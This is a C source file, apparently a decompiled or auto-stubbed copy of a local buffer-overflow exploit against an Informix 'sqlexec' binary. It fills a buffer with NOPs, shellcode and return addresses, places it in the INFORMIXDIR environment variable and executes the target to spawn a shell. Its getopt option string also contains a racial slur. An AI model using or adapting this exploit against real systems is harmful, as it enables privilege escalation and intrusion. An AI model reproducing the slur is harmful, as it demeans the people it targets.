#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int retadd; int offset; } ;

/* Variables and functions */
 int BUFFERSIZE ; 
 int EOF ; 
 void* atoi (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  execl (char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  exit (int) ; 
 int getopt (int,char**,char*) ; 
 int /*<<< orphan*/ * lunixshell ; 
 char* malloc (int) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  setenv (char*,char*,int) ; 
 int strlen (int /*<<< orphan*/ *) ; 
 int strtoul (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int) ; 
 TYPE_1__* targets ; 
 size_t type ; 
 int /*<<< orphan*/  usage (char*) ; 

int main(int argc, char *argv[])
{
	int i, c, os;
	long *addr_ptr;
	char *buffer, *ptr, *osptr;

	
	/* offset = atoi(argv[1]);  */
 	/* esp    = retadd; */
      /* ret    = esp-offset; */


     if(argc < 3)
       {
         usage(argv[0]);
         return 1;
       }

      while(( c = getopt (argc, argv, "t:r:o:nigger"))!= EOF){

      switch (c)
        {

         case 't':
            type = atoi(optarg);
            break;
 
         case 'r':
            targets[type].retadd = strtoul(optarg, NULL, 16);
            break;

         case 'o':
            targets[type].offset = atoi(optarg);
            break;

        default:
          usage(argv[0]);
          return 1;
        }
   }


	printf("[<>] - Stack pointer: 0x%x\n", targets[type].retadd);
	printf("[<>] - Offset: 0x%x\n", targets[type].offset);
	printf("[<>] - Return addr: 0x%x\n", targets[type].retadd - targets[type].offset);


	/* allocate memory for our buffer */
	if(!(buffer = malloc(BUFFERSIZE))) {
		printf("Couldn't allocate memory.\n");
		exit(-1);
	}

	/* fill buffer with ret addr's */
	ptr = buffer;
	addr_ptr = (long *)ptr;
	for(i=0; i<BUFFERSIZE; i+=4)
		*(addr_ptr++) = targets[type].retadd - targets[type].offset;

	/* fill first half of buffer with NOPs */
	for(i=0; i<BUFFERSIZE/2; i++)
		buffer[i] = '\x90';

	/* insert shellcode in the middle */
	ptr = buffer + ((BUFFERSIZE/2) - (strlen(lunixshell)/2));
	for(i=0; i<strlen(lunixshell); i++)
		*(ptr++) = lunixshell[i];


	/* call the vulnerable program passing our exploit buffer as the argument */

	buffer[BUFFERSIZE-1] = 0;
      setenv("INFORMIXDIR", buffer, 1);
	execl("./sqlexec", "sqlexec", NULL); 
	return 0;
}